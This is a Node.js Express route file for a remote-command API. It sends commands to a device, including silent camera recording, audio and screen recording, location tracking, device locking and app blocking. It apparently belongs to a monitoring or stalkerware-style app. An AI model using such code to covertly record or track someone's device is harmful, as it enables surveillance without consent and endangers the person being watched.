/**
 * Remote Command Routes
 */

const express = require('express');
const router = express.Router();
const { authMiddleware } = require('../utils/auth');
const ActivityLog = require('../models/ActivityLog');

const VALID_COMMANDS = {
    START_CAMERA: 'Start silent camera recording',
    STOP_CAMERA: 'Stop camera recording',
    TAKE_PHOTO: 'Take a photo',
    START_FRONT_CAMERA: 'Start front camera recording',
    START_BACK_CAMERA: 'Start back camera recording',
    START_AUDIO: 'Start audio recording',
    STOP_AUDIO: 'Stop audio recording',
    START_SCREEN_RECORD: 'Start screen recording',
    STOP_SCREEN_RECORD: 'Stop screen recording',
    SET_BRIGHTNESS: 'Set screen brightness (0-100)',
    SET_VOLUME: 'Set volume (0-100)',
    LOCK_DEVICE: 'Lock the device',
    WAKE_DEVICE: 'Wake up the device',
    VIBRATE: 'Vibrate the device',
    BLOCK_APPS: 'Block all apps',
    UNBLOCK_APPS: 'Unblock all apps',
    BLOCK_APP: 'Block specific app',
    GET_LOCATION: 'Get current location',
    ENABLE_LOCATION: 'Enable location services',
    DISABLE_LOCATION: 'Disable location services',
    START_AUTO_RECORD: 'Start automatic recording',
    STOP_AUTO_RECORD: 'Stop automatic recording'
};

// POST /api/commands/send
router.post('/send', authMiddleware, async (req, res) => {
    try {
        const { command, value, device_id } = req.body;

        if (!command || !device_id) {
            return res.status(400).json({ success: false, error: 'Command and device_id are required' });
        }

        if (!VALID_COMMANDS[command]) {
            return res.status(400).json({ success: false, error: `Invalid command: ${command}` });
        }

        const commandId = `cmd_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

        await ActivityLog.create({
            deviceId: device_id,
            eventType: 'remote_command',
            description: `Command sent: ${command}`,
            metadata: { command_id: commandId, command, value },
            userId: req.user.id
        });

        const broadcastToDevice = req.app.get('broadcastToDevice');
        if (broadcastToDevice) {
            broadcastToDevice(device_id, 'remote_command', {
                command_id: commandId,
                command,
                value,
                timestamp: new Date().toISOString()
            });
        }

        res.json({
            success: true,
            command_id: commandId,
            command,
            status: 'sent',
            message: `Command "${command}" sent to device`
        });
    } catch (error) {
        console.error('Send command error:', error.message);
        res.status(500).json({ success: false, error: 'Internal server error' });
    }
});

module.exports = router;
